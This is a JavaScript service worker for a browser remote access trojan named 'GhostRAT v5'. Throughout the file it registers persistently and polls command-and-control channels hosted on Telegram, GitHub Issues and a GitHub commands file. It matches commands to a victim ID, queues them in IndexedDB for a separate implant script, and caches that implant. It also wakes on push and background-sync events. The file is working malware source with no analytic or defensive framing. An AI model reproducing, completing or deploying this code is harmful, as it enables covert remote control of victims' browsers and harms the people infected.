/**
 * Service Worker for GhostRAT v5
 * Polls C2 channels in background, queues results
 */

const GHOSTRAT_SW = 'ghostrat-sw-v1';
const CACHE_NAME = `ghostrat-cache-${GHOSTRAT_SW}`;

// C2 config (loaded from IndexedDB on install)
let config = null;
let state = null;

// ── Lifecycle ────────────────────────────────────────────────────────────────

self.addEventListener('install', (event) => {
    self.skipWaiting(); // Activate immediately
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim()); // Claim all clients
});

// ── Fetch Interception ───────────────────────────────────────────────────────

self.addEventListener('fetch', (event) => {
    // Cache implant JS
    if (event.request.url.includes('ghostrat-webgpu.js')) {
        event.respondWith(cacheFirst(event.request));
    }
});

// ── Core Polling ─────────────────────────────────────────────────────────────

/**
 * Load config and state from IndexedDB, then start polling.
 */
async function initC2() {
    try {
        const db = await openDB();
        const tx = db.transaction(['config', 'state'], 'readonly');

        const configStore = tx.objectStore('config');
        const configReq = configStore.get('ghostrat_config');

        const stateStore = tx.objectStore('state');
        const stateReq = stateStore.get('ghostrat_state');

        config = await new Promise((resolve, reject) => {
            configReq.onsuccess = () => resolve(configReq.result || null);
            configReq.onerror = () => reject(configReq.error);
        });

        state = await new Promise((resolve, reject) => {
            stateReq.onsuccess = () => resolve(stateReq.result || null);
            stateReq.onerror = () => reject(stateReq.error);
        });

        if (config && state) {
            pollC2();
            // Periodic poll every 60 seconds
            setInterval(pollC2, 60000);
        }
    } catch (e) {
        console.error('[GhostRAT SW] Init error:', e);
    }
}

/**
 * Main C2 polling routine — checks all configured channels.
 */
async function pollC2() {
    if (!config || !state) return;

    try {
        // Poll Telegram
        if (config.telegram) {
            await pollTelegram();
        }

        // Poll GitHub Issues
        if (config.github) {
            await pollGitHubIssues();
        }

        // Poll GitHub API (commands.json)
        if (config.github_api) {
            await pollGitHubApi();
        }
    } catch (e) {
        console.error('[GhostRAT SW] C2 poll error:', e);
    }
}

// ── Telegram Channel ─────────────────────────────────────────────────────────

async function pollTelegram() {
    const url = `https://api.telegram.org/bot${config.telegram.bot_token}/getUpdates`;

    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.ok && data.result && data.result.length > 0) {
            for (const update of data.result) {
                // Skip already-processed updates
                if (update.update_id <= (state.lastUpdateId || 0)) continue;

                const message = update.message?.text;
                if (!message) continue;

                // Parse command: "GHOST <victim_id> <cmd_type_hex>"
                const match = message.match(/GHOST\s+(\S+)\s+([0-9a-fA-F]+)/);
                if (!match) continue;

                const [, victimId, cmdType] = match;
                if (victimId !== state.victimId) continue;

                // Extract data after the hex command type
                const dataStr = message.substring(message.indexOf(cmdType) + cmdType.length).trim();

                const cmd = {
                    type: parseInt(cmdType, 16),
                    data: dataStr,
                    timestamp: Date.now()
                };

                // Store result in IndexedDB for implant to retrieve
                await storeCommandResult(cmd);
            }

            // Update last update ID to avoid re-processing
            state.lastUpdateId = data.result[data.result.length - 1].update_id;
            await saveState();
        }
    } catch (e) {
        console.error('[GhostRAT SW] Telegram poll error:', e);
    }
}

// ── GitHub Issues Channel ────────────────────────────────────────────────────

async function pollGitHubIssues() {
    const { repo_owner, repo_name, token } = config.github;
    const url = `https://api.github.com/repos/${repo_owner}/${repo_name}/issues?labels=ghostrat-v5&state=open`;

    try {
        const response = await fetch(url, {
            headers: {
                'Authorization': `token ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });
        const issues = await response.json();

        for (const issue of issues) {
            // Extract victim ID from issue title: "Victim: <id>"
            const titleMatch = issue.title.match(/^Victim:\s*(.+)/i);
            if (!titleMatch) continue;

            const victimId = titleMatch[1].trim();
            if (victimId !== state.victimId) continue;

            // Get issue comments for commands
            const commentsUrl = `https://api.github.com/repos/${repo_owner}/${repo_name}/issues/${issue.number}/comments`;
            const commentsResp = await fetch(commentsUrl, {
                headers: {
                    'Authorization': `token ${token}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });
            const comments = await commentsResp.json();

            for (const comment of comments) {
                // Skip already-processed comments
                if (comment.id <= (state.lastCommentId || 0)) continue;
                if (comment.body.startsWith('[PROCESSED]')) continue;

                // Parse command from comment body
                const match = comment.body.match(/GHOST\s+\S+\s+([0-9a-fA-F]+)/);
                if (!match) continue;

                const cmdType = parseInt(match[1], 16);
                const cmd = {
                    type: cmdType,
                    data: '',
                    source: 'github_issue',
                    issue_number: issue.number,
                    comment_id: comment.id,
                    timestamp: comment.created_at
                };

                await storeCommandResult(cmd);

                // Mark comment as processed
                try {
                    await fetch(`https://api.github.com/repos/${repo_owner}/${repo_name}/issues/comments/${comment.id}`, {
                        method: 'PATCH',
                        headers: {
                            'Authorization': `token ${token}`,
                            'Content-Type': 'application/json',
                            'Accept': 'application/vnd.github.v3+json'
                        },
                        body: JSON.stringify({ body: '[PROCESSED] ' + comment.body })
                    });
                } catch (e) {
                    console.error('[GhostRAT SW] Failed to mark comment processed:', e);
                }
            }
        }
    } catch (e) {
        console.error('[GhostRAT SW] GitHub Issues poll error:', e);
    }
}

// ── GitHub API Channel (commands.json) ────────────────────────────────────────

async function pollGitHubApi() {
    const { repo_owner, repo_name, token, file_path } = config.github_api;
    const url = `https://api.github.com/repos/${repo_owner}/${repo_name}/contents/${file_path}`;

    try {
        const response = await fetch(url, {
            headers: {
                'Authorization': `token ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });
        const data = await response.json();

        if (data.content) {
            const content = atob(data.content);
            const commands = JSON.parse(content);

            for (const cmd of commands) {
                if (cmd.victim_id !== state.victimId) continue;
                if (cmd.id <= (state.lastCommandId || 0)) continue;

                await storeCommandResult(cmd);
            }
        }
    } catch (e) {
        console.error('[GhostRAT SW] GitHub API poll error:', e);
    }
}

// ── IndexedDB Helpers ────────────────────────────────────────────────────────

/**
 * Open (or create) the GhostRAT IndexedDB.
 */
function openDB() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open('GHOSTRAT_SW_DB', 1);

        request.onupgradeneeded = (e) => {
            const db = e.target.result;

            if (!db.objectStoreNames.contains('commands')) {
                db.createObjectStore('commands', { keyPath: 'id', autoIncrement: true });
            }
            if (!db.objectStoreNames.contains('state')) {
                db.createObjectStore('state');
            }
            if (!db.objectStoreNames.contains('config')) {
                db.createObjectStore('config');
            }
        };

        request.onsuccess = () => resolve(request.result);
        request.onerror = () => reject(request.error);
    });
}

/**
 * Store a command result in IndexedDB.
 */
async function storeCommandResult(cmd) {
    const db = await openDB();
    const tx = db.transaction('commands', 'readwrite');
    const store = tx.objectStore('commands');
    await store.add(cmd);
}

/**
 * Persist state to IndexedDB.
 */
async function saveState() {
    const db = await openDB();
    const tx = db.transaction('state', 'readwrite');
    const store = tx.objectStore('state');
    await store.put(state, 'ghostrat_state');
}

// ── Cache Helpers ────────────────────────────────────────────────────────────

async function cacheFirst(request) {
    const cached = await caches.match(request);
    if (cached) return cached;

    try {
        const response = await fetch(request);
        const cache = await caches.open(CACHE_NAME);
        cache.put(request, response.clone());
        return response;
    } catch {
        return new Response('Offline', { status: 503 });
    }
}

// ── Push Notifications ───────────────────────────────────────────────────────

self.addEventListener('push', (event) => {
    const data = event.data ? event.data.json() : {};
    // Wake up and poll C2
    if (Object.keys(data).length > 0) {
        event.waitUntil(pollC2());
    }
});

// ── Background Sync ──────────────────────────────────────────────────────────

self.addEventListener('sync', (event) => {
    if (event.tag === 'poll-c2') {
        event.waitUntil(pollC2());
    }
});

// ── Start ────────────────────────────────────────────────────────────────────

// Initialize C2 polling when service worker activates
self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
    initC2();
});
